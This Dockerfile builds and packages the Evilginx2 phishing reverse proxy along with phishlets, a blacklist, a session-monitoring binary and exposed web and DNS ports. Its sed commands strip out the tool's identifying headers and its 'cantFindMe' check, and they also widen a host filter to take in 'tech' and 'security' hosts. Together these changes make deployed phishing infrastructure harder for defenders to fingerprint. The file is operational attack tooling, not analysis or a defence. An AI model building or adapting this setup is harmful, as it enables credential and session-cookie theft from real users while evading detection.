# Stage 1 - Build EvilGinx2 app and monitor_sessions binary
FROM alpine:latest AS build

ARG GOLANG_VERSION=1.20
ARG GOPATH=/opt/go
ARG GITHUB_USER="kgretzky"
ARG EVILGINX_REPOSITORY="github.com/${GITHUB_USER}/evilginx2"
ARG INSTALL_PACKAGES="go git bash"
ARG PROJECT_DIR="${GOPATH}/src/${EVILGINX_REPOSITORY}"
ARG EVILGINX_BIN="/bin/evilginx"

# Install necessary packages including Go
RUN apk add --no-cache ${INSTALL_PACKAGES}

# Install Go
RUN wget https://dl.google.com/go/go${GOLANG_VERSION}.linux-amd64.tar.gz \
    && tar -C /usr/local -xzf go${GOLANG_VERSION}.linux-amd64.tar.gz \
    && rm go${GOLANG_VERSION}.linux-amd64.tar.gz

# Add Go to PATH
ENV PATH="/usr/local/go/bin:${PATH}"

# Clone EvilGinx2 repository
RUN mkdir -pv ${GOPATH}/src/github.com/${GITHUB_USER} \
    && git -C ${GOPATH}/src/github.com/${GITHUB_USER} clone https://${EVILGINX_REPOSITORY}

# Modify and build EvilGinx2
WORKDIR ${PROJECT_DIR}
RUN sed -i -e 's/egg2 := req.Host/\/\/egg2 := req.Host/g' \
           -e 's/e_host := req.Host/\/\/e_host := req.Host/g' \
           -e 's/req.Header.Set(string(hg), egg2)/\/\/req.Header.Set(string(hg), egg2)/g' \
           -e 's/req.Header.Set(string(e), e_host)/\/\/req.Header.Set(string(e), e_host)/g' \
           -e 's/p.cantFindMe(req, e_host)/\/\/p.cantFindMe(req, e_host)/g' core/http_proxy.go \
    && sed -i 's/arpa/tech\|security\|arpa/g' core/http_proxy.go \
    && sed -i 's/"%02d:%02d:%02d", t.Hour()/"%02d\/%02d\/%04d - %02d:%02d:%02d", t.Day(), int(t.Month()), t.Year(), t.Hour()/g' log/log.go \
    && sed -i 's/10 \* time.Minute/10 \* time.Second/g' core/http_proxy.go \
    && go get -v && go build -v \
    && cp evilginx2 ${EVILGINX_BIN} \
    && mkdir -v /app && cp -vr phishlets /app

# Build monitor_sessions binary
COPY ./Evilginx2-docker/monitor_sessions.go /root/.evilginx/monitor_sessions.go
RUN go build -o /app/monitor_sessions /root/.evilginx/monitor_sessions.go

# Stage 2 - Runtime container
FROM alpine:latest

ENV EVILGINX_PORTS="443 80 53/udp"
ARG EVILGINX_BIN

# Install runtime dependencies
RUN apk add --no-cache python3 jq py3-pip sqlite sqlite-libs

# Copy Evilginx2 binary and other built files from the build stage
WORKDIR /app
COPY --from=build ${EVILGINX_BIN} ${EVILGINX_BIN}
COPY --from=build /app .

# Copy configuration files
COPY ./Evilginx2-docker/blacklist.txt /root/.evilginx/blacklist.txt
COPY ./Evilginx2-docker/setup.sh /app/setup.sh
COPY ./Evilginx2-docker/phishlets /app/phishlets

# Set execute permissions for setup.sh
RUN chmod +x /app/setup.sh

# Configure Runtime Container
EXPOSE ${EVILGINX_PORTS}

# Default command
#CMD [${EVILGINX_BIN}, "-p", "/app/phishlets"]
